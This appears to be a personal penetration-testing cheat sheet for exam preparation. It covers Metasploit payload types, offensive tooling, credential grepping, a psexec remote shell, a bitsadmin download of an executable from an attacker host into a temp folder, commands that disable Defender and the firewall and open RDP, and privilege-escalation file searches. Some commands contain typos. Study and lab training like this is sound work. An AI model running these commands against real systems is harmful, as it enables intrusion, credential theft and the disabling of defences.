****IMPORTANT*******
=====================
“windows/shell_reverse_tcp” and “windows/shell/reverse_tcp”. The first one is unstaged, while the second is staged. 
You will see the same naming convention with many other payloads too.

What’s the difference between staged and unstaged? 
If you use an unstaged payload, the entire payload is sent in one hit and executed on the target machine.
This means that you can catch the shell with a simple netcat listener and it will work fine. 
If you’re using a staged payload, you need to use a Metasploit multi handler to catch the shell (this is allowed in the exam, by the way!). 
If you attempt to use a netcat listener to catch the shell, the connection will be received and then die instantly. 
Staged payloads are a smaller initial payload which then downloads the full payload from the Metasploit handler on your local box.

Buffer OverFlow
================

https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/


exploit most of the machines below tools:
==========================================

--Nmap, Netcat for port scanning and testing vulnerabilities
--Dirbuster, Gobuster, Nikto and Burpsuite for Web application scanning
--Tcpdump, Wireshark for sniffing traffic
--Python HTTP Servers to serve RFI php shells.
--Mimikatz, pwdump, fgdump, pwdump and procmon for password dumping and pass the hash/golden ticket attacks
--Cuda Hashcat for password cracking (Nvidia graphics card)
--Iptables, proxychains and sshuttle for routing hops
--Medusa, Hydra for Http login form bruteforcing
--Grep, sed, awk, sort, uniq, find, findstr, cut for finding passwords and sensitive files during privilege escalation and post exploitation recon
--Snmpenum, enum4linux, nullinux, smbmap for smb and snmp enumeration
--Powershell scripts and bitsadmin(built-in windows tool) to download files (highly recommended if you are not using meterpreter shell)
--Sendemail, Python Servers for social engineering (yes, you will have to perform SE on automated bot systems for client side attacks)
--Accesscheck.exe from sysinternals and Ntrights.exe, Churrasco.exe to find access misconfigurations
--Psexec for lateral movements and remote shells
--Cadaver and davtest for windows asp based web server to test read/write access

reverse shells of perl, python, bash, socat and awk from pentestmonkey for quick tcp reverse shells.

Post Exploit Enumeration
========================

grep -rnw '/' -ie 'pass' --color=always
grep -rnw '/' -ie 'password' --color=always
grep -rnw '/' -ie 'DB_PASS' --color=always
grep -rnw '/' -ie 'DB_PASSWORD' --color=always
grep -rnw '/' -ie 'DB_USER' --color=always

File Upload on linux systems via base64 encoding
=================================================

cat file2upload | base64

--Once the file is converted to base64, 
--you can just create a new file on the remote system and copy the base64 output of the above file into it. 
--Next step would be to reverse the base64 to binary

cat fileWithBase64Content | base64 -d > finalBinary

--You can also use the smbserver.py from Impacket’s repo to host a temporary smb server 
--and fetch files in windows from remote smb servers using the net use command.

PSexec Shells of Remote Systems
================================

.\psexec64.exe \\192.168.x.x -u .\administrator -p admin@123 cmd.exe

Powershell Sudo for Windows
===========================
--There maybe times when you know the creds to admin, but will have a low privileged shell. Unlike Linux, we cannot sudo on windows machines. So, I wrote a simple powershell script for that which can run a separate file as admin. You can run a batch file to add a new superuser or just execute a meterpreter binary as admin. 
--The below command is to be run in a powershell window:

$pw= convertto-securestring "EnterPasswordHere" -asplaintext -force
$pp = new-object -typename System.Management.Automation.PSCredential -argumentlist "EnterDomainName\EnterUserName",$pw
$script = "C:\Users\EnterUserName\AppData\Local\Temp\test.bat"
Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process $script -verb Runas}'

--If however you want to run the powershell from a cmd prompt, 
--you can run store the above command in a xyz.ps1 file and run it in cmd as below:

powershell -ExecutionPolicy Bypass -File xyz.ps1 

---The Set-ExecutionPolicy cmdlet enables you to determine which Windows PowerShell scripts (if any) will be allowed to run on ---your computer. Windows PowerShell has four different execution policies:

---Restricted – No scripts can be run. Windows PowerShell can be used only in interactive mode.
---AllSigned – Only scripts signed by a trusted publisher can be run.
---RemoteSigned – Downloaded scripts must be signed by a trusted publisher before they can be run.
---Unrestricted – No restrictions; all Windows PowerShell scripts can be run.


Download files in Windows with bitsadmin
=========================================

bitsadmin /transfer mydownloadjob /download /priority normal http://<attackerIP>/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe

Disable firewall/defender and enable RDP for all
================================================

sc stop WinDefend
netsh advfirewall show allprofiles
netsh advfirewall set allprofiles state off
netsh firewall set opmode disable
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f


Find files with SUID permission
================================

find / -perm -4000 -type f 2>/dev/null

Find files with open permissions
=================================

find / -perm -777 -type f 2>/dev/null

Find files with SUID permission for current user
==================================================

find / perm /u=s -user `whoami` 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null

Find files with writable permission for current user or current group
=====================================================================

find / perm /u=w -user `whoami` 2>/dev/null
find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null
find / -perm /u+w -user `whoami` 2>/dev/nul

Find directories with writable permissions for current user or current group
=============================================================================

find / perm /u=w -type -d -user `whoami` 2>/dev/null
find / -perm /u+w,g+w -d -user `whoami` 2>/dev/null

So, I made myself a few commitments:

Try avoiding Metasploit at all costs. Neither exploits nor meterpreter shells. 
(However I had to use them at few places where I needed to use shellcode or needed to quickly migrate my shell from an unstable exploit/process)
Only use msfvenom for building shellcode.
Use netcat for reverse shells.
